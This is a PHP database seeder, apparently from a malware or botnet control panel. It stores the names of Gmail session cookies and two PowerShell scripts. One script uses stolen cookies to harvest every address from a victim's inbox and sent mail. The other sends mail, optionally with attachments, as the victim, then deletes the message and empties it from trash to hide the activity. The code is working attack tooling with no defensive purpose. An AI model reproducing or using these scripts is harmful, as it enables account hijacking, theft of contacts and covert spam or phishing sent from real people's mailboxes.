<?php

use Illuminate\Database\Seeder;

class WebmailSeeder extends Seeder
{
    /**
     * Run the database seeds.
     *
     * @return void
     */
    public function run()
    {
        // WEBMAIL SCRIPT TYPES
        DB::table('webmail_script_types')->insert([
            ['name' => 'Grab emails'],
            ['name' => 'Send email']
        ]);

        // WEBMAIL HOSTS
        DB::table("webmail_hosts")->insert([ 'name' => 'gmail' ]);

        // WEBMAIL COOKIES
        DB::table("webmail_cookies")->insert([
            [
                'name' => 'SID',
                'idhost' => 1,
                'domain' => '.google.com'
            ],
            [
                'name' => 'HSID',
                'idhost' => 1,
                'domain' => '.google.com'
            ],
            [
                'name' => 'SSID',
                'idhost' => 1,
                'domain' => '.google.com'
            ],
            [
                'name' => 'OSID',
                'idhost' => 1,
                'domain' => 'mail.google.com'
            ],
            [
                'name' => 'NID',
                'idhost' => 1,
                'domain' => '.google.com'
            ]
        ]);

        // WEBMAIL SCRIPTS
        DB::table("webmail_scripts")->insert([
            [
                'idtype' => 1,
                'idhost' => 1,
                'script' => 'Function Grab {
[cmdletbinding()]
    param(
        [bool]$collectFromInbox,
        [bool]$collectFromOutbox,
        [bool]$collectFromAddressBook,
        [bool]$collectFromFolders,
        [System.Object]$cookies
    )

    process {
        Add-Type -AssemblyName System.Web;

        # SID
        if (-not $cookies["SID"]) { return Write-Error "Cookie SID not found"; }

        # HSID
        if (-not $cookies["HSID"]) { return Write-Error "Cookie HSID not found"; }

        # SSID
        if (-not $cookies["SSID"]) { return Write-Error "Cookie SSID not found"; }

        # NID
        if (-not $cookies["NID"]) { return Write-Error "Cookie NID not found"; }

        # OSID
        if (-not $cookies["OSID"]) { return Write-Error "Cookie OSID not found"; }

        # get addresses from inbox
        $emails = @();
        
        # setup settings
        $wc = New-Object system.Net.WebClient;
        $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, (
            "SID=" + $cookies["SID"][0] + 
            "; HSID=" + $cookies["HSID"][0] + 
            "; SSID=" + $cookies["SSID"][0] + 
            "; OSID=" + $cookies["OSID"][0] +
            "; NID=" + $cookies["NID"][0]));
        $wc.Encoding = [System.Text.Encoding]::UTF8;

        #For ($i=0; $i -lt $wc.Headers.Count; $i++) {Write-Output($wc.Headers.Keys[$i] + ":" + $wc.Headers[$i])}#: $wc.Headers.Get($i); }
        
        # ik param for next request
        $ik = $wc.downloadString("https://mail.google.com/mail/");
        $matches = (New-Object System.Text.RegularExpressions.Regex(\'\'var GLOBALS=\\[.+?\\,.+?\\,.+?\\,.+?\\,.+?\\,.+?\\,.+?\\,.+?\\,.+?\\,\\"(.+?)\\",\'\', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)).matches($ik);
        $ik = $matches[0].Groups[1].Value;

        # debug headers
        #For ($i=0; $i -lt $wc.Headers.Count; $i++) {Write-Output($wc.Headers.Keys[$i] + ":" + $wc.Headers[$i])}#: $wc.Headers.Get($i); }

        if($collectFromInbox) {
        
            # get inbox mails
            $res = $wc.UploadString("https://mail.google.com/mail/?ik=" + $ik + "&view=tl&start=0&num=100000000&rt=c&search=inbox", \'\'POST\'\');

            # parse mails
            $matches = (New-Object System.Text.RegularExpressions.Regex(\'\'email\\\\u003d\\\\\\\"(.+?)\\\\\\\"\'\', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)).matches($res);
            For ($i=0; $i -lt $matches.Count; $i++) { $emails += $matches[$i].Groups[1].Value; }
        }

        # get addresses from outbox
        if($collectFromOutbox) {
        
            # get inbox outbox mails
            $res = $wc.UploadString("https://mail.google.com/mail/?ik=" + $ik + "&view=tl&start=0&num=100000000&rt=c&search=sent", \'\'POST\'\');
            
            # parse mails
            $matches = (New-Object System.Text.RegularExpressions.Regex(\'\'email\\\\u003d\\\\\\\"(.+?)\\\\\\\"\'\', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)).matches($res);
            For ($i=0; $i -lt $matches.Count; $i++) { $emails += $matches[$i].Groups[1].Value; }
        }

        # get addresses from address book
        if($collectFromAddressBook) {
            # end
        }

        #get addresses from folders
        if($collectFromFolders) {
            # end
        }

        #Remove duplicates
        $tmpEms = $emails;
        $emails = @();
        For ($i=0; $i -lt $tmpEms.Count; $i++) {
        
            $isSet = $false;
                
            For ($l=0; $l -lt $emails.Count; $l++) {

                if ($tmpEms[$i] -eq $emails[$l]){ $isSet = $true; }
            }

            if ($isSet -eq $false){ $emails += $tmpEms[$i]; }
        }
        
        write-output $emails;
    }
}'
            ],
            [
                'idtype' => 2,
                'idhost' => 1,
                'script' => 'Function Send {
[cmdletbinding()]
    param(
        [System.Object]$to,
        [string]$subject,
        [string]$body,
        [string]$attachPath,
        [System.Object]$cookies
    )

    process {
        Add-Type -AssemblyName System.Web;

        # check cookies

        # SID
        if (-not $cookies["SID"]) { return Write-Error "Cookie SID not found"; }

        # HSID
        if (-not $cookies["HSID"]) { return Write-Error "Cookie HSID not found"; }

        # SSID
        if (-not $cookies["SSID"]) { return Write-Error "Cookie SSID not found"; }

        # OSID
        if (-not $cookies["OSID"]) { return Write-Error "Cookie OSID not found"; }

        # NID
        if (-not $cookies["NID"]) { return Write-Error "Cookie NID not found"; }
        
        # setup settings
        $wc = New-Object system.Net.WebClient;
        $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, (
            "; SID=" + $cookies["SID"][0] + 
            "; HSID=" + $cookies["HSID"][0] + 
            "; SSID=" + $cookies["SSID"][0] + 
            "; OSID=" + $cookies["OSID"][0] + 
            "; NID=" + $cookies["NID"][0]));
        $wc.Encoding = [System.Text.Encoding]::UTF8;
        
        # ik param for next request
        $ik = $wc.downloadString("https://mail.google.com/mail/");
        $respHeaders = $wc.ResponseHeaders;
        $matches = (New-Object System.Text.RegularExpressions.Regex(\'\'var GLOBALS=\\\[.+?\\\,.+?\\\,.+?\\\,.+?\\\,.+?\\\,.+?\\\,.+?\\\,.+?\\\,.+?\\\,\\"(.+?)\\",\'\', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)).matches($ik);
        $ik = $matches[0].Groups[1].Value;

        for ($i = 0; $i -lt $respHeaders.Count; $i++){
            if ($respHeaders.GetKey($i) -eq "Set-Cookie")
            {
                $gmail_at = ((New-Object System.Text.RegularExpressions.Regex(\'\'GMAIL_AT=(?<gmail_at>.*?);\'\', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)).matches($respHeaders[$i]))[0].Groups[1].Value;
                $cookies["GMAIL_AT"] = @($gmail_at, "/mail", "mail.google.com");
            }
        }

        # SEND MESSAGE
        if($to.Count) {
            
            $postdata = "";

            $form = New-Object Collections.Specialized.NameValueCollection;
            
            # add recipient
            for ($i = 0; $i -lt $to.Count; $i++)
            {
                $postdata += "to=" + $to[$i] + "&";
            }
            $form.add("to", "");
            $form.add("cc", "");
            $form.add("bcc", "");
            $form.add("subjectbox", $subject);
            $form.add("composeid", "");
            $form.add("from", "");
            $form.add("subject", $subject);
            $form.add("draft", "");
            $form.add("bwd", "");
            $form.add("rm", "");
            $form.add("ac", "[]");
            $form.add("abc", "");
            $form.add("isHtml", "1");
            $form.add("body", $body);
            $form.add("pte", "");
            $form.add("pti", "");
            $form.add("bpfs", "");
            $form.add("uet", "");
            $form.add("pbgt", "");
            $form.add("pbgas", "");
            $form.add("pbgir", "");
            $form.add("msg_encrypt", 0);
            $form.add("signature", 0);
            $form.add("securityindicator", 0);

            for ($i = 0; $i -lt $form.Count - 1; $i++)
            {
                $postdata += $form.GetKey($i);
                $postdata += "=";
                $postdata += [System.Uri]::EscapeUriString($form[$i]);
                $postdata += "&";
            }

            $postdata += $form.GetKey($i);
            $postdata += "=";
            $postdata += [System.Uri]::EscapeUriString($form[$i]);

            $CookieContainer = New-Object System.Net.CookieContainer;
            $CookieContainer.add((new-object System.Net.Cookie("GMAIL_AT", $cookies["GMAIL_AT"][0], $cookies["GMAIL_AT"][1], $cookies["GMAIL_AT"][2])));
            $CookieContainer.add((new-object System.Net.Cookie("SID", $cookies["SID"][0], $cookies["SID"][1], $cookies["SID"][2])));
            $CookieContainer.add((new-object System.Net.Cookie("HSID", $cookies["HSID"][0], $cookies["HSID"][1], $cookies["HSID"][2])));
            $CookieContainer.add((new-object System.Net.Cookie("SSID", $cookies["SSID"][0], $cookies["SSID"][1], $cookies["SSID"][2])));
            $CookieContainer.add((new-object System.Net.Cookie("OSID", $cookies["OSID"][0], $cookies["OSID"][1], $cookies["OSID"][2])));
            $CookieContainer.add((new-object System.Net.Cookie("NID", $cookies["NID"][0], $cookies["NID"][1], $cookies["NID"][2])));
            
            $buffer = [text.encoding]::ascii.getbytes($postData)

            $url = "https://mail.google.com/mail/?ui=2&ik=" + $ik + "&at=" + $cookies["GMAIL_AT"][0] + "&view=up&act=sm&rt=c&search=drafts";

            [net.httpWebRequest] $req = [net.webRequest]::create($url)
            $req.method = "POST"
            $req.Accept = "*/*"
            $req.Headers.Add("Accept-Language: en-US")
            $req.ContentType = "application/x-www-form-urlencoded"
            $req.ContentLength = $buffer.length
            $req.KeepAlive = $true
            $req.CookieContainer = $CookieContainer
            $reqst = $req.getRequestStream()
            $reqst.write($buffer, 0, $buffer.length)
            $reqst.flush()
            $reqst.close()
            [net.httpWebResponse] $res = $req.getResponse()
            $resst = $res.getResponseStream()
            $sr = new-object IO.StreamReader($resst)
            $id = $sr.ReadToEnd()
            $res.close()
            
            $id = (New-Object System.Text.RegularExpressions.Regex(\'\'",\\["(?<id>[0-9a-z]*?)",\'\', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)).matches($id)[0].Groups["id"].Value;
            #write-output $id;

            if ($id -eq "0")
            {
                #write-output "not sent";
            } else {
                #write-output "sent"

                # REMOVE MESSAGE

                $url = "https://mail.google.com/mail/?ui=2&ik=" + $ik + "&at=" + $cookies["GMAIL_AT"][0] + "&view=up&act=tr&mb=0&rt=j&search=sent";

                $buffer = [text.encoding]::ascii.getbytes("t=" + $id)

                [net.httpWebRequest] $req = [net.webRequest]::create($url)
                $req.method = "POST"
                $req.Accept = "*/*"
                $req.Headers.Add("Accept-Language: en-US")
                $req.ContentType = "application/x-www-form-urlencoded"
                $req.ContentLength = $buffer.length
                $req.KeepAlive = $true
                $req.CookieContainer = $CookieContainer
                $reqst = $req.getRequestStream()
                $reqst.write($buffer, 0, $buffer.length)
                $reqst.flush()
                $reqst.close()
                [net.httpWebResponse] $res = $req.getResponse()
                $resst = $res.getResponseStream()
                $sr = new-object IO.StreamReader($resst)
                $result = $sr.ReadToEnd()
                $res.close()

                #write-output $result;

                # REMOVE FROM TRASH

                $url = "https://mail.google.com/mail/?ui=2&ik=" + $ik + "&at=" + $cookies["GMAIL_AT"][0] + "&view=up&act=dl&mb=0&rt=c&search=trash";

                $buffer = [text.encoding]::ascii.getbytes("t=" + $id)

                [net.httpWebRequest] $req = [net.webRequest]::create($url)
                $req.method = "POST"
                $req.Accept = "*/*"
                $req.Headers.Add("Accept-Language: en-US")
                $req.ContentType = "application/x-www-form-urlencoded"
                $req.ContentLength = $buffer.length
                $req.KeepAlive = $true
                $req.CookieContainer = $CookieContainer
                $reqst = $req.getRequestStream()
                $reqst.write($buffer, 0, $buffer.length)
                $reqst.flush()
                $reqst.close()
                [net.httpWebResponse] $res = $req.getResponse()
                $resst = $res.getResponseStream()
                $sr = new-object IO.StreamReader($resst)
                $result = $sr.ReadToEnd()
                $res.close()
            }
        }
    }
}'
            ]
        ]);
    }
}
